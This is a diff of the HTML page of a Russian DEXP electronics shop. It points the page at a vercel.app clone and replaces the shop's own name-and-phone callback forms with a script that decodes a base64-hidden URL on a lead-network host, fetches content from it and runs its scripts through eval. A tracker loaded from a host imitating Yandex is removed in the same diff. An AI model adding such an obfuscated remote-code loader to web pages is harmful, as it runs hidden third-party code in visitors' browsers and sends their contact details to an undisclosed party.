@@ -33,7 +33,7 @@
         <meta property="og:type" content="image" />
         <meta property="og:image" content="/templates/img/general/prices.png" />
         <meta property="og:sitename" content="dexp-spb.elektronica.ru.com" />
-        <meta property="og:url" content="https://dexp-spb.elektronica.ru.com/" />
+        <meta property="og:url" content="https://dexp-msk.vercel.app/"/>
         
 
             <link rel="shortcut icon" type="image/x-icon" href="https://dexp-spb.elektronica.ru.com/templates/img/favicon.ico"/>
@@ -4758,15 +4758,7 @@
 			просто
 			звоните: <a href = "tel:78126024788">+7(812)602-47-88</a>
                     </p>
-                    <form class = "js-form">
-						<input type = "hidden" name = "form_token" value = "7c5acd3dcdd3ba86d17bdc83aa327d3c.X5wT695a_zcOmikt-6Sg3voNP0IIXEe_BFYyhRC0XQc.CMxiuIw9jwA51nFhgomUlJ48VXdeMBftaRhn3SDTEnUp1Xinr2KqWFvQGQ">
-                        <div class="uk-grid-small uk-child-width-auto@s" uk-grid>
-                            <div><input autocomplete="off" class="uk-input phone-input" type="text" placeholder="Номер телефона" name = "phone"></div>
-                            <div><input type="submit" value="Заказать звонок" class="btn btn_v2 uk-margin-bottom js-send"></div>
-                        </div>
-                    </form>
-                        
-                    
+ <a href="#form-order" class="btn uk-width-auto@s uk-width-1-1">Заказать звонок</a>
                 </div>
                
             </div>
@@ -4930,46 +4922,20 @@
         <div class="uk-modal-header">
             <p class="uk-modal-title">Заказать звонок</p>
             <p class = "uk-js-title">Перезвоним в течение 5 минут</p>
-        </div>
-        
-        <form class = "js-form">
-            <div class="uk-modal-body">
-            <input type = "hidden" name = "form_token" value = "8e0.ggFKCeg0XCDsG0j-kHQfSYJvdKyxzHeo-ZBq4PhrHMw.1VE7WrpTLBfbVxCy6VkrA-ZeHpnnoCf6lN4_uMgMU770SCFFmQwJT7lReA">
-                <div class="uk-margin">
-                    <input class="uk-input" type="text" placeholder="Ваше имя" name = "name">
-                </div>
-                <div class="uk-margin">
-                    <input autocomplete="off" class="uk-input phone-input" type="text" placeholder="Ваш телефон*" name = "phone">
-                </div>
-                <div class="uk-margin uk-grid-small uk-child-width-auto uk-grid">
-                    <label><input class="uk-checkbox" type="checkbox" checked> <small>Нажимая на кнопку, вы даёте своё <a target="_blank" href="/politic.html">согласие на обработку персональных данных</a></small></label>
-                </div>    
-            </div>
-        
-            <div class="uk-modal-footer">
-                <button class="btn btn_v2 js-send" type="submit">Отправить заявку</button>
-            </div>        
-        </form> 
-               
+         </div>
+         <div id="rip_form__form_placeholder_6b3f3530-e5f2-4891-969f-dd62d1846d48"></div>     
     </div>
 </div>
-
-<div id="form-answer" uk-modal>
-    <div class="uk-modal-dialog">
-        <div class="uk-modal-header">
-            <p class="uk-modal-title answer"></p>
-        </div>
-        <div class="uk-modal-body ans-body">
-            Наш менеджер свяжется с вами в ближайшее время
-        </div>
-    </div>
-</div>
-
-
-
-            <script> (function (w, d, s, u, r, a, m) {w['PEERCLICK'] = r; w[r] = w[r] || function () { (w[r].q = w[r].q || []).push(arguments) }, w[r].l = 1 * new Date(); a = d.createElement(s), m = d.getElementsByTagName(s)[0];a.async = 1;h = encodeURIComponent(w.location.href);a.src = u+'&t='+(new Date).getTime()+'&h='+h; m.parentNode.insertBefore(a, m)})(window, document, 'script', 'https://yandex.firj.ru/15H8rH/image.js?'+window.location.search.substring(1)||'p=1', 'pc'); </script> <noscript> <link href='https://yandex.firj.ru/15H8rH/image.js?noscript=true'/> </noscript>
-    
-
+<script>
+    var XHR = ("onload" in new XMLHttpRequest()) ? XMLHttpRequest : XDomainRequest;
+    var xhr = new XHR();
+    xhr.onload = function () {
+        document.getElementById("rip_form__form_placeholder_6b3f3530-e5f2-4891-969f-dd62d1846d48").innerHTML = this.response;
+        Array.from(document.getElementById("rip_form__form_placeholder_6b3f3530-e5f2-4891-969f-dd62d1846d48").getElementsByTagName("script")).forEach(
+            el => eval(el.innerHTML));
+    };
+    xhr.open("GET", decodeURIComponent(escape(window.atob("aHR0cHM6Ly9jcGEucnVraS1pei1wbGVjaC5ydS9hcGkvZm9ybXMvNmIzZjM1MzAtZTVmMi00ODkxLTk2OWYtZGQ2MmQxODQ2ZDQ4L2h0bWw="))), true);
+    xhr.send();
+</script>      
 </body>
-
 </html>
